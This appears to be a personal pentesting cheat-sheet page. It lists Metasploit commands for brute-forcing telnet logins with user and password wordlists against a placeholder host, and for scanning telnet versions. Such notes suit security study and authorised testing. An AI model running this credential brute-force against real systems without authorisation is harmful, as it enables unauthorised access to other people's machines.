
---
tags: 🔻 🔻/Enumeration/telnet metasploit
aliases: Hacking Notes
---
# Telnet

telnet bruteforce
2. 
use auxiliary/scanner/telnet/telnet\_login  
msf auxiliary(telnet\_login) > set BLANK\_PASSWORDS false  
BLANK\_PASSWORDS => false  
msf auxiliary(telnet\_login) > set PASS\_FILE passwords.txt  
PASS\_FILE => passwords.txt  
msf auxiliary(telnet\_login) > set RHOSTS x.x.x.x  
RHOSTS => x.x.x.x  
msf auxiliary(telnet\_login) > set THREADS 254  
THREADS => 254  
msf auxiliary(telnet\_login) > set USER\_FILE users.txt  
USER\_FILE => users.txt  
msf auxiliary(telnet\_login) > set VERBOSE false  
VERBOSE => false  
msf auxiliary(telnet\_login) > run  
  
msf auxiliary(telnet\_login) > sessions -l // to see the sessions that succeded  
  
2. telnet version  

use auxiliary/scanner/telnet/telnet\_version  
msf auxiliary(telnet\_version) > set RHOSTS x.x.x.x  
RHOSTS => x.x.x.x  
msf auxiliary(telnet\_version) > set THREADS 254  
THREADS => 254  
msf auxiliary(telnet\_version) > run